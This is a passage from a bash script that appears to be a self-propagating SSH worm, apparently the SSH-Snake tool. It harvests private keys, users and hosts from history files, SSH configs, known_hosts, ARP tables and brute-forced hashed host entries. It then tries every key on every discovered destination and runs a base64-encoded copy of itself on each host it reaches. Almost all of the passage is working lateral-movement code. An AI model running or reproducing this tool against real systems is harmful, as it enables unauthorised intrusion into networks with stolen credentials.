          # break if there are no hashed known hosts left.
          [[ $hashed_number -lt 1 ]] && break
          for ((j=0; j<256; j++)); do
            local found_hosts_count

            found_hosts_count=0

            # break if there are no hashed known hosts left.
            [[ $hashed_number -lt 1 ]] && break

            ssh_host="${octets[0]}.${octets[1]}.$i.$j"
            [[ -v 'ssh_hosts["$ssh_host"]' || ${#ssh_hosts["$ssh_host"]} -gt 0 ]] && continue # Skip this because we have already tried it earlier.

            found_hosts_count="$(${ss} "${sshkeygen[@]}" "$ssh_file" -F "$ssh_host" 2>/dev/null | grep -cE 'Host .* found')" && ((hashed_number -= found_hosts_count)) && [[ -n "$home_user" ]] && add_ssh_dest "$home_user@$ssh_host"
          done
        done
      fi
    done
  done
}

# Find: home folders, SSH-related files, SSH keys, SSH users, SSH hosts, SSH dests.
find_all() {
  retry_all_dests
  find_home_folders
  init_ssh_files

  find_ssh_keys
  find_ssh_keys_paths
  find_from_bash_history
  find_from_ssh_config

  (( ${#priv_keys[@]} )) || fin

  # None of the following strategies discover keys.

  find_from_authorized_keys
  find_from_last
  find_from_known_hosts
  find_from_hosts
  find_arp_neighbours
  find_d_block
  find_from_prev_dest
  find_from_ignore_list

  find_from_hashed_known_hosts # Should always be last as it relies on ssh_hosts being filled.
}

# If use_combinate_users_hosts_aggressive is enabled, combinate all:
# ssh_hosts and interesting_hosts
# ssh_users and interesting_users
#
# Then, join all ssh_users@ssh_hosts.
combinate_users_hosts_aggressive() {
  local ssh_user
  local ssh_host

  for ssh_host in "${interesting_hosts[@]}"; do
    add_ssh_host "$ssh_host"
  done

  for ssh_user in "${interesting_users[@]}"; do
    add_ssh_user "$ssh_user"
  done

  for ssh_dest in "${interesting_dests[@]}"; do
    add_ssh_dest "$ssh_dest"
  done

  for ssh_host in "${!ssh_hosts[@]}"; do
    for ssh_user in "${!ssh_users[@]}"; do
      add_ssh_dest "$ssh_user@$ssh_host"
    done
  done
}

# Add any interesting dests, combine any interesting users with all hosts, any interesting hosts with all users, and interesting hosts with interesting users.
combinate_interesting_users_hosts() {
  local ssh_user
  local ssh_host

  for ssh_dest in "${interesting_dests[@]}"; do
    add_ssh_dest "$ssh_dest"
  done

  for ssh_user in "${interesting_users[@]}"; do
    add_ssh_user "$ssh_user"
    for ssh_host in "${!ssh_hosts[@]}"; do
      add_ssh_dest "$ssh_user@$ssh_host"
    done
  done

  for ssh_host in "${interesting_hosts[@]}"; do
    add_ssh_host "$ssh_host"
    for ssh_user in "${!ssh_users[@]}"; do
      add_ssh_dest "$ssh_user@$ssh_host"
    done
  done

  for ssh_host in "${interesting_hosts[@]}"; do
    for ssh_user in "${interesting_users[@]}"; do
      add_ssh_dest "$ssh_user@$ssh_host"
    done
  done
}

# Deduplicate ssh_dests by resolving the hosts for each ssh_dest, checking whether the user, host, or resolved dest is ignored, then adding the destinations back to the original ssh_dests array.
deduplicate_resolved_hosts_keys() {
  local ssh_dest
  declare -A valid_ssh_dests
  declare -A resolved_hosts
  local res
  local use_mac
  local to

  # DNS timeout of 5 seconds per address (bleh, hack).
  command -v timeout >/dev/null 2>&1 && to="timeout $ssh_timeout"

  # Use getent if it's available.
  if getent ahostsv4 -- 1.1.1.1 >/dev/null 2>&1; then
    res="$to getent ahostsv4 --"
  # Otherwise dscacheutils for mac.
  elif dscacheutil -q host -a name 1.1.1.1 >/dev/null 2>&1; then
    res="$to dscacheutil -q host -a name"
    use_mac="1"
  else
    # If we can't use getent or dscacheutil, we're on an unknown type of system (with bash?!)
    # Use printf instead of chained_print() to be consistent.
    printf "INTERNAL_MSG: command not found: RESOLVE (%s)\n" "$(uname -a 2>/dev/null)"
    fin
  fi

  # Pre-resolve each host concurrently in the hope that the answers will be cached.
  for ssh_dest in "${!ssh_dests[@]}"; do
    local ssh_host

    is_ssh_dest "$ssh_dest" || continue
    ssh_host="${ssh_dest#*@}"
    [[ -v 'resolved_hosts["$ssh_host"]' || ${#resolved_hosts["$ssh_host"]} -gt 0 ]] && continue

     resolved_hosts["$ssh_host"]=1
    ($res "$ssh_host" > /dev/null 2>&1 &)
  done

  wait

  resolved_hosts=()

  for ssh_dest in "${!ssh_dests[@]}"; do
    local ssh_user
    local ssh_host
    local resolved_ssh_host

    is_ssh_dest "$ssh_dest" || continue # Checks if the host has been ignored in this loop

    ssh_user="${ssh_dest%%@*}"
    ssh_host="${ssh_dest#*@}"

    # Check if the host has already been resolved. If it has, use the internally cached answer.
    if [[ -v 'resolved_hosts["$ssh_host"]' || ${#resolved_hosts["$ssh_host"]} -gt 0 ]]; then
      :
    else
      # If the host has not already been resolved, resolve it.
      # If resolution of ${resolved_hosts["$ssh_host"]} failed before, we won't hit this code path because the host will be added to _ignored_hosts (and will be skipped using is_ssh_dest().
      # macos
      local resolved_ssh_hosts # list of ipv4 addresses for a host
      if [[ -n "$use_mac" ]]; then
        resolved_ssh_hosts="$($res "$ssh_host" 2>/dev/null | awk '/ip_address:/{print $NF}')"
      else
      # linux
        resolved_ssh_hosts="$($res "$ssh_host" 2>/dev/null | awk '/RAW/{print $1}')"
      fi

      for resolved_ssh_host in "${resolved_ssh_hosts[@]}"; do
        # Answer must begin with 1 or 2 ($res 0.1.2.3 will respond with 0.1.2.3).
        if [[ "${resolved_ssh_host:0:1}" =~ [12] ]]; then
          [[ "$resolved_ssh_host" =~ ^127\. ]] && resolved_ssh_host="127.0.0.1" # If it's loopback, always use 127.0.0.1
          [[ -v '_ignored_hosts["$resolved_ssh_host"]' || ${#_ignored_hosts["$resolved_ssh_host"]} -gt 0 ]] && continue
          # Cache the host
          resolved_hosts["$ssh_host"]+="$resolved_ssh_host "
        else
          # Ignore this RESOLVED host (might save us a few cycles).
          # Don't add the ssh_host to _ignored_hosts become it may have non-ignored hosts, too.
          [[ -n "$resolved_ssh_host" ]] && _ignored_hosts["$resolved_ssh_host"]=1
        fi
      done
    fi

    # No IPs resolved for the host, add the host to _ignored_host.
    if [[ "${#resolved_hosts["$ssh_host"]}" -lt 7 ]]; then
      _ignored_hosts["$ssh_host"]=1
      continue
    fi

    # Loop through each host (which are space-separated now), so no quotation marks.
    for resolved_ssh_host in ${resolved_hosts["$ssh_host"]}; do
      valid_ssh_dests["$ssh_user@$resolved_ssh_host"]=1
    done
  done

  ssh_dests=()

  for ssh_dest in "${!valid_ssh_dests[@]}"; do
    add_ssh_dest "$ssh_dest"
  done
}

# Check whether a file is a real file, exists, contains something, and is readable.
is_file() {
  local filename

  filename="$1"

  [[ -z "$filename" ]] && return 1

  [[ -v 'files["$filename"]' || ${#files["$filename"]} -gt 0 ]] && return 0
  [[ -v 'not_files["$filename"]' || ${#not_files["$filename"]} -gt 0 ]] && return 1

  ${s} test -s "$filename" && ${s} test -r "$filename" && ${s} test -f "$filename" && files["$filename"]=1 && return 0

  not_files["$filename"]=1
  return 1
}

# Checks whether a folder is a real folder, and is readable.
is_dir() {
  local dir_name

  dir_name="$1"

  [[ -z "$dir_name" ]] && return 1

  [[ -v 'folders["$dir_name"]' || ${#folders["$dir_name"]} -gt 0 ]] && return 0
  [[ -v 'not_folders["$dir_name"]' || ${#not_folders["$dir_name"]} -gt 0 ]] && return 1

  ${s} test -d "$dir_name" && ${s} test -r "$dir_name" && folders["$dir_name"]=1 && return 0

  not_folders["$dir_name"]=1
  return 1
}

# Checks whether a string is a candidate for an ssh user.
is_ssh_user() {
  local ssh_user

  ssh_user="$1"

  [[ -z "$ssh_user" ]] && return 1

  [[ -v '_ignored_users["$ssh_user"]' || ${#_ignored_users["$ssh_user"]} -gt 0 ]] && return 1

  [[ -v 'ssh_users["$ssh_user"]' || ${#ssh_users["$ssh_user"]} -gt 0 ]] && return 0

  [[ "$ssh_user" =~ ^$allowed_users_chars$ ]] || return 1

  return 0
}

# Checks whether a string is a candidate for an ssh host.
is_ssh_host() {
  local ssh_host

  ssh_host="$1"

  [[ -z "$ssh_host" ]] && return 1

  [[ -v '_ignored_hosts["$ssh_host"]' || ${#_ignored_hosts["$ssh_host"]} -gt 0 ]] && return 1

  [[ -v 'ssh_hosts["$ssh_host"]' || ${#ssh_hosts["$ssh_host"]} -gt 0 ]] && return 0

  [[ "$ssh_host" =~ ^$allowed_host_chars+$ ]] || return 1

  [[ "${ssh_host:0:1}" == "-" || "${ssh_host:0-1}" == "-" || "${ssh_host:0:1}" == "." || "${ssh_host:0-1}" == "." || "$ssh_host" == *"-."* || "$ssh_host" == *"--"* ]] && return 1

  if [[ "$ssh_host" =~ ^[0-9.]+$ ]]; then
    [[ "$ssh_host" =~ ^[0-9]+(\.[0-9]+){3}$ ]] || return 1
  fi

  return 0
}

# Checks whether a string is a candidate for an ssh dest.
is_ssh_dest() {
  local ssh_user
  local ssh_host
  local ssh_dest

  ssh_dest="$1"

  [[ -z "$ssh_dest" ]] && return 1

  ssh_dest="${ssh_dest,,}"

  # XXX: The below line is intrinsically flawed because even if $ssh_dest is already in ssh_dests, this does not mean $ssh_host has not been added to $_ignored_hosts. We keep it here to remember not to add it again.
  # [[ -v 'ssh_dests["$ssh_dest"]' || ${#ssh_dests["$ssh_dest"]} -gt 0 ]] && return 0

  [[ -v '_ignored_dests["$ssh_dest"]' || ${#_ignored_dests["$ssh_dest"]} -gt 0 ]] && return 1

  ssh_user="${ssh_dest%%@*}"
  ssh_host="${ssh_dest#*@}"

  is_ssh_host "$ssh_host" && is_ssh_user "$ssh_user" && return 0

  return 1
}

# Add to ssh_users if it's a user.
add_ssh_user() {
  local ssh_user

  ssh_user="$1"
  is_ssh_user "$ssh_user" && ssh_users["$ssh_user"]=1 && return 0

  return 1
}

# Add to ssh_hosts if it's a host.
add_ssh_host() {
  local ssh_host

  ssh_host="$1"
  is_ssh_host "$ssh_host" && ssh_hosts["$ssh_host"]=1 && return 0

  return 1
}

# Add to ssh_dests if it's a dest.
# Note: This also adds to ssh_hosts and ssh_users.
add_ssh_dest() {
  local ssh_dest
  local ssh_host
  local ssh_user

  ssh_dest="$1"

  ssh_dest="${ssh_dest,,}"

  ssh_user="${ssh_dest%%@*}"
  ssh_host="${ssh_dest#*@}"

  is_ssh_dest "$ssh_dest" && ssh_dests["$ssh_dest"]=1 && ssh_hosts["$ssh_host"]=1 && ssh_users["$ssh_user"]=1 && return 0

  return 1
}

# Print a line in recursive_scan beginning with the appropriate separator length and chain.
# Since we're calling this within recursive_scan, we need to add another indentation on top of $indent, since we're emulating the next host.
# Argument $1 is the chain to print.
# Argument $2 is what to print after the chain. Normally, that would probably be the ssh_dest.
rs_chained_print() {
  printf "%s%*s%s->%s\n" "$indent" 1 "" "$1" "$2"
}

# Call rs_chained_print twice, with separate chains.
# $1 is chain 1, $2 is chain 2, and $3 is what to print
double_rs_chained_print() {
  local ssh_dest
  local ssh_host
  local ssh_user

  ssh_dest="$3"
  ssh_user="${ssh_dest%%@*}"
  ssh_host="${ssh_dest#*@}"

  rs_chained_print "$1" "$3"
  rs_chained_print "$2" "$ssh_user@($ssh_host)"
}

# The main SSH function of the script.
# Loop through each destination, then loop through each private key file.
# Attempt ssh on all of the valid destinations with each of the private key files.
recursive_scan() {
  declare -A retry_dests
  declare -A retry_keys
  local ssh_dest
  local priv_key
  local key_file

  # Loop through each destination.
  for ssh_dest in "${!ssh_dests[@]}"; do
    local ssh_user
    local ssh_host

    ssh_user="${ssh_dest%%@*}"
    ssh_host="${ssh_dest#*@}"

    # Check whether the host and user are valid (the host may have been added while inside this loop).
    is_ssh_user "$ssh_user" || continue
    is_ssh_host "$ssh_host" || continue

    # Loop through each ssh key.
    for priv_key in "${!priv_keys[@]}"; do
      local t_hosts_chain
      local t_hostnames_chain
      local skip_this_dest
      local line
      local line_num

      key_file="${priv_keys["$priv_key"]}"

      # Check whether the key is still valid (it may have been added to the ignore list while inside this loop).
      [[ -v '_ignored_key_files["$key_file"]' || ${#_ignored_key_files["$key_file"]} -gt 0 ]] && continue

      # A $key_file is appended with ! if sudo is being used.
      # Define the future hosts_chain
      t_hosts_chain="${hosts_chain}[${s:+!}${key_file}]"
      # Define the future hostnames_chain
      t_hostnames_chain="${hostnames_chain}[${s:+!}${key_file}]"
      # If set to 1, we will stop trying any new keys for this dest (aka we break).
      skip_this_dest=0
      # Record the amount of lines for each ssh attempt.
      line_num=0

      # Loop through each line of the SSH output one-by-one.
      while IFS= read -r line; do
        ((line_num++))
        # If there is a connection error a dest, don't bother trying other keys (or other users) for the other users of the same host.
        #
        # ssh: Could not resolve hostname server: Name or service not known ; should never happen since we use ip addresses, but pick it up anyways.
        # ssh: connect to host ip port 22: Connection refused
        # ssh: connect to host ip port 22: Connection timed out
        # ssh: connect to ip port 22: No route to ip
        # ssh: connect to host ip port 22: Network is unreachable
        # ssh: connect to host port 22: No route to host
        # ssh: connect to host ip port 22: Operation timed out
        if [[ "$line" == *"resolve hostname"* || "$line" == *"connect to "* ]]; then
          _ignored_hosts["$ssh_host"]=1
          skip_this_dest=1
          break
        fi

        # bash argument list too long; we can't continue, so print where we are, the maximum argument length (because why not), and the ignore_list (which is the non-static part of the script which is causing the argument list too long).
        # It may be useful to take the ignore_list and set those ip destinations as ignored_dests.
        if [[ "$line" == *"Argument list too long"* ]]; then
          double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
          rs_chained_print "$t_hosts_chain" "$ssh_dest [ARG_LIMIT:$(getconf -a 2>/dev/null | awk '/ARG_MAX/{print $NF; exit}'), $(printf "%s" "$ignore_list" | base64 | tr -d '\n')]"
          printf "INTERNAL_MSG: ARG_LIMIT\n"
          fin
        fi

        # This is an unrecoverable error, so kill everything.
        if [[ "$line" == "INTERNAL_MSG: ARG_LIMIT" ]]; then
          printf "INTERNAL_MSG: ARG_LIMIT\n"
          fin
        fi

        # Various warnings may occur when using ssh, bash, or other programs. In general, we can simply ignore these messages as they're warnings, not errors, and we have no use for them at all.
        #
        # Warning: Permanently added '...' (RSA) to the list of known hosts.
        # Permission denied (publickey,password).
        # grep: [file]: Permission denied
        # identity_sign: private key [file] contents do not match public
        # load pubkey [file]: invalid format
        # sudo: unable to resolve host
        # warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
        # key_load_public: invalid format
        if [[ "$line" == *"Warning: Permanently added"* || "$line" == *"Permission denied"* || "$line" == *"contents do not match public"* || "$line" == *"load pubkey"* || "$line" == *"unable to resolve host"* || "$line" == *"warning: setlocale"* || "$line" == *"key_load_public: invalid format"* ]]; then
          continue
        fi

        # The HostkeyAlgorithms may not be supported. XXX: should we be reporting this? Can we somehow bypass it? Maybe we can try adding to ssh_options?
        #
        # Unable to negotiate with 192.168.1.1 port 22: no matching host key type found. Their offer: ssh-dss
        if [[ "$line" == *"Unable to negotiate with"* ]]; then
          continue
        fi

        # Various errors may occur due to an ssh key not being valid. Ignore those keys in the future.
        #
        # Warning: Identity file [file] not accessible: No such file or directory.
        # Warning: Identity file [file] not accessible: Permission denied.
        # no such identity: [file]: No such file or directory
        # Load key [file]: invalid format
        # Load key [file]: bad permissions
        if [[ "$line" == "Warning: Identity file"* || "$line" == "Load key"* || "$line" == *"No such file or directory"* ]]; then
          _ignored_key_files["$key_file"]=1
          break
        fi

        # A destination has finished scanning and we add it to the ignore list. We also propagate it.
        # When a destination is finished scanning, it gets added to the ignore_list in all intermediate destinations.
        # However, remember, that for: A->B->C, the ignore_list on destination "B" will initially be longer than the ignore_list of "A". This is because while we add ourself(server) to the ignore_list when starting, we don't propagate it until we have finished.
        if [[ "$line" == "INTERNAL_MSG: ignore list: "* ]]; then
          local ignore_new

          ignore_new="${line#*INTERNAL_MSG: ignore list: }"
          if [[ "$ignore_list" != *"$ignore_new"* ]]; then
            ignore_list+="$ignore_new"
          fi
          printf "%s\n" "$line"
          continue # Don't break, as it may be being passed through from a much higher destination.
        fi

        # If a destination has been scanned but fails a check to ensure all the programs that this script needs are present, report that the destination can be SSH'd to, and the function that is missing.
        if [[ "$line" == "INTERNAL_MSG: command not found: "* ]]; then
          local missing_cmd

          double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"

          missing_cmd="${line#*INTERNAL_MSG: command not found: }"
          rs_chained_print "$t_hosts_chain" "$ssh_dest [fail,cmd,$missing_cmd]"
          break
        fi

        # sh: bash: inaccessible or not found
        # sh: bash: not found
        # Bash is not available on the system.
        if [[ "$line" == *"sh: bash"* ]]; then
          double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
          rs_chained_print "$t_hosts_chain" "$ssh_dest [fail,cmd,bash]"
          break
        fi

        # If a destination has no memory, it is likely to crash while running this script using awk, or some other program. Catch it and report that it is out of memory.
        if [[ "$line" == *"Segmentation fault"* || "$line" == *"cannot allocate"* || "$line" == *"core dumped"* ]]; then
          double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
          rs_chained_print "$t_hosts_chain" "$ssh_dest [OoM]"
          break
        fi

        # Shell is /usr/sbin/nologin
        if [[ "$line" == *"This account is currently not available"* ]]; then
          double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
          rs_chained_print "$t_hosts_chain" "$ssh_dest [NoLogin]"
          break
        fi

        # Gitlab instances may be accessed, and it's quite easy to detect it. Since git uses ssh, we can record this.
        #
        # Disallowed command
        if [[ "$line" == "Disallowed command" ]]; then # Gitlab
          double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
          rs_chained_print "$t_hosts_chain" "$ssh_dest [GitLab]"
          break
        fi

        # Github, too.
        #
        # Invalid command: cmd
        if [[ "$line" == "Invalid command: "* || "$line" == "exec request failed on channel "* ]]; then # Github
          double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
          rs_chained_print "$t_hosts_chain" "$ssh_dest [GitHub]"
          break
        fi

        # SSH may sporadically fail due to connection issues in various ways. Looking at the source for openssh and using all of the servers that reported errors, I've determined that the following errors may occur when a connection to a server is broken one way or another.
        # When any of these errors occur naturally, we retry the destination (and the key which is associated with this destination).
        #
        # Write failed: Broken pipe
        # Timeout, server [host] not responding
        # Connection to host closed by remote host
        # Read from remote host [host]: [error]
        # Connection closed by [host] XXX: This may mean it's vulnerable to https://joshua.hu/ssh-username-enumeration-ubuntu-18
        # Connection closed by [host] port 22 XXX: This may mean it's vulnerable to https://joshua.hu/ssh-username-enumeration-ubuntu-18
        # ssh_exchange_identification: read: Connection reset by peer
        # Connection from/to ip [host] timed out
        # Disconnected from [host]
        # Connection reset by [host]/peer, kex_exchange_identification: read: Connection reset by peer
        # Connection to [host] closed by remote host. XXX: This may mean it's vulnerable to https://joshua.hu/ssh-username-enumeration-ubuntu-18
        # Connection to [host] timed out while waiting to read
        # kex_exchange_identification: Connection closed by remote host
        # ssh_exchange_identification: Connection closed by remote host
        # Connection timed out during banner exchange
        # Connection to [host] port [port] timed out
        # Bad remote protocol version identification
        # Protocol major versions differ
        if [[ "$line" == *"Broken pipe"* || "$line" == *"Timeout, server"* || "$line" == "Connection to"* || "$line" == "Read from remote host"* || "$line" == *"Connection closed by"* || "$line" == *" timed out"* || "$line" == *"Disconnected from"* || "$line" == *"Connection reset by"* || "$line" == *"closed by remote host"* || "$line" == *"kex_exchange_identification"* || "$line" == *"ssh_exchange_identification"* || "$line" == *"Bad remote protocol version identification"* || "$line" == *"Protocol major versions differ"* ]]; then
          if [[ "$line_num" -le 3 ]]; then
            # If we receive one of these errors within the first three lines of the connection being made, it most likely means there is something fatally wrong with the server.
            # This could be a server vulnerable to https://joshua.hu/ssh-username-enumeration-ubuntu-18, or some other error where the connection was never established in the first place, and is never going to be.
            # If the error message is not that of a possibly vulnerable server, then add the host to _ignored_hosts.
            if [[ "$line" != "Connection closed by"* && "$line" != "Connection to"* && "$line" != *"closed by remote host." ]]; then
              _ignored_hosts["$ssh_host"]=1
            fi
            # Either way, skip this destination because it's never going to work.
            skip_this_dest=1
            break
          fi
          # Otherwise, we retry the destination.
          retry_keys["$priv_key"]="$key_file"
          retry_dests["$ssh_dest"]=1
          rs_chained_print "$t_hosts_chain" "$ssh_dest [ConnErr]"
          break
        fi

        # Some AWS servers (EC2?) restrict ssh to certain users. We can grab the correct user and attempt to SSH in it when we perform our retries.
        #
        # Please login as the user "ubuntu" rather than the user "root".
        if [[ "$line" == "Please login as the user"* ]]; then # AWS
          local aws_ssh_user

          double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"

          aws_ssh_user="${line#*\"}"
          aws_ssh_user="${aws_ssh_user%%\"*}"
          if is_ssh_dest "$aws_ssh_user@$ssh_host"; then
            rs_chained_print "$t_hosts_chain" "$ssh_dest [fail,aws,$aws_ssh_user]"
            if [[ ! -v 'ssh_dests["$aws_ssh_user@$ssh_host"]' || ${#ssh_dests["$aws_ssh_user@$ssh_host"]} -eq 0 ]]; then
              retry_dests["$aws_ssh_user@$ssh_host"]=1
              retry_keys["$priv_key"]="$key_file"
            fi
          else
            rs_chained_print "$t_hosts_chain" "$ssh_dest [fail,aws,$line]"
          fi
          break
        fi

        # Eventually, we have no special cases left.
        # If the line contains the chain, then it means the line has also been "dealt with" (i.e. it is an expected output) from the remote destination. For example: [00000]     user@host[key]->user@host2[key2]->user@host3: something.
        # Since it contains "user@host[key]->user@host2[key2]->user@host3", that means the remote destination printed it from the script.
        # So, just pass it down to other destinations down the chain.
        if [[ "$line" == *"$t_hosts_chain"* || "$line" == *"$t_hostnames_chain"* ]]; then # Includes a chain, so just print it.
          printf "%s\n" "$line"
        else
          # If the line doesn't contain the chain, then it's an unexpected output. So, print the chain including the destination, and the line.
          rs_chained_print "$t_hosts_chain" "$ssh_dest [line]: $line" # Doesn't include a chain, so the message is coming from something we didn't expect, so print it with [line].
        fi
      done < <(${s} ssh "${ssh_options[@]}" -i "$key_file" -- "$ssh_dest" "echo 'printf \"%s\" \$1 | base64 -d | bash --noprofile --norc -s \$1 \$2 \$3 \$4 \$5' | bash --noprofile --norc -s -- '$script' '$(printf "%s" "$t_hosts_chain" | base64 | tr -d '\n')' '$ignore_list' '$ssh_dest' '$(printf "%s" "$t_hostnames_chain" | base64 | tr -d '\n')'" </dev/null 2>&1 | tr -d '\r')
      [[ $skip_this_dest -eq 1 ]] && break

    done
  done

  if [[ $use_find_from_ignore_list -eq 2 ]]; then
    local ssh_dest

    # Re-load the new ignore_list into the ignore_list_array array.
    load_ignore_list_array

    for ssh_dest in "${!ignore_list_array[@]}"; do
      [[ -z "$ssh_dest" ]] && continue
      [[ -v 'ssh_dests["$ssh_dest"]' || ${#ssh_dests["$ssh_dest"]} -gt 0 ]] && continue # Don't bother scanning if it's already been scanned
      retry_dests["$ssh_dest"]=1
    done
    for priv_key in "${!priv_keys[@]}"; do
      key_file="${priv_keys["$priv_key"]}"
      retry_keys["$priv_key"]="$key_file"
    done
  fi

  # Do we have some dests to retry? (AWS or connection errors)
  (( ${#retry_dests[@]} )) || return
  (( ${#retry_keys[@]} )) || return
  # Have we already tried too many times?
  [[ $retry_count -gt 0 ]] || return

  ((retry_count--))

  ssh_dests=()
  priv_keys=()

  for ssh_dest in "${!retry_dests[@]}"; do
    # add_ssh_dest is null-op'd here, so add it manually.
    is_ssh_dest "$ssh_dest" && ssh_dests["$ssh_dest"]=1
  done

  for priv_key in "${!retry_keys[@]}"; do
    [[ -v '_ignored_key_files["$priv_key"]' || ${#_ignored_key_files["$priv_key"]} -gt 0 ]] && continue
    priv_keys["$priv_key"]="${retry_keys["$priv_key"]}"
  done


  (( ${#ssh_dests[@]} )) || return
  (( ${#priv_keys[@]} )) || return
  # priv_keys maybe empty, add_ssh_dest could be newly ignored.

  printf "%s%s: EXTERNAL_MSG: INFO: Trying again with %d dests and %s keys (attempts left: %d)\n" "$indent" "$hosts_chain" "${#ssh_dests[@]}" "${#priv_keys[@]}" "$retry_count"
  recursive_scan
}

setup

exec_custom_cmds

find_all

combinate_users_hosts_aggressive
combinate_interesting_users_hosts

deduplicate_resolved_hosts_keys

(( ${#ssh_dests[@]} )) || fin
(( ${#priv_keys[@]} )) || fin

printf "%s%s: EXTERNAL_MSG: INFO: Beginning with %d dests and %d keys\n" "$indent" "$hosts_chain" "${#ssh_dests[@]}" "${#priv_keys[@]}"

recursive_scan

fin
MAIN_SCRIPT
)
printf "%s" "$THIS_SCRIPT" | bash --noprofile --norc
